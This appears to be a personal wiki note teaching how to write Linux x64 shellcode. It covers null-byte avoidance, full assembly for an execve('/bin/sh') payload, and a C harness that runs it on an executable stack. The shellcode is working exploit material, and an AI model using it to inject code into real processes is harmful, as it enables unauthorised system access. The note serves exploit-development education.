# Writing Shellcode (Assembly)

Shellcode is machine code that is injected into a running process to execute a payload (e.g., spawn a shell `/bin/sh`).

## 🛡️ The Challenges
Unlike normal assembly programs, shellcode:
1.  **Must be Position Independent (PIC)**: Can run from any memory address.
2.  **Must avoid Null Bytes (`0x00`)**: If injected via `strcpy`, a null byte terminates the string and cuts off the payload.
3.  **Must be Compact**: Fits into small buffers.

## 🛠️ Avoiding Null Bytes

Normal instructions often contain zeros.
`mov rax, 0` -> `48 c7 c0 00 00 00 00` (Contains 4 null bytes!)

### Solutions
1.  **XOR**: `xor rax, rax` -> `48 31 c0` (Result is 0, no nulls).
2.  **Push/Pop**: `push 0x3b; pop rax` (Set RAX to 59).
3.  **Use Smaller Registers**: `mov al, 0x3b` (Modify only lower byte).

## 🚀 Example: Execve("/bin/sh", NULL, NULL) (Linux x64)

Goal: Call `sys_execve` (syscall 59).
-   `RDI` = Pointer to string "/bin/sh"
-   `RSI` = NULL (argv)
-   `RDX` = NULL (envp)

```asm
section .text
global _start

_start:
    ; 1. Push "/bin//sh" (8 bytes) onto stack
    ; Note: // is same as /, but makes string 8 bytes long (aligned)
    ; String: 0x68732f2f6e69622f (Little Endian: /bin//sh)
    
    xor rdx, rdx        ; RDX = 0 (envp)
    push rdx            ; Null terminator for string
    
    mov rax, 0x68732f2f6e69622f
    push rax            ; Push "/bin//sh"
    mov rdi, rsp        ; RDI points to stack (string)
    
    push rdx            ; Push NULL (argv array terminator)
    push rdi            ; Push pointer to string (argv[0])
    mov rsi, rsp        ; RSI points to argv array (optional for /bin/sh)
    ; Actually, simpler: just set RSI=0 for NULL argv
    xor rsi, rsi
    
    ; 2. Call sys_execve (59)
    push 0x3b
    pop rax             ; RAX = 59
    
    syscall             ; Exec!
```

## 🧪 Testing Shellcode

Extract the bytes:
```bash
nasm -f elf64 shellcode.asm -o shellcode.o
objdump -d shellcode.o
# Extract opcodes: \x48\x31\xd2...
```

Run in C harness:
```c
char code[] = "\x48\x31\xd2...";

int main() {
    int (*ret)() = (int(*)())code;
    ret();
}
```
*Compile with `-z execstack` to allow execution on stack.*

---
[[00-Index|Back to Assembly Index]]
